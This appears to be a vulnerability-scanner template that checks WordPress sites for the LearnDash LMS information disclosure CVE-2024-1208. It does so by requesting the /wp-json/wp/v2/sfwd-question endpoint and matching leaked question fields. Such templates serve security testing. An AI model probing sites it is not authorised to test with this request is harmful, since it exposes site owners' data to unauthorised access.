id: poc-yaml-learndash-lms-info-disclosure
info:
  name: WordPress Plugin LearnDash LMS 信息泄露漏洞(CVE-2024-1208)
  severity: medium
  tags:
  - 信息泄露
  - CVE-2024-1208
  finger: wordpress
requests:
- method: GET
  path: /wp-json/wp/v2/sfwd-question
  expression: 'status_code == 200

    && contains(headers,"Content-Type: application/json")

    && contains(body,"id")

    && contains(body,"points_total")

    '
variables: {}
transport: http
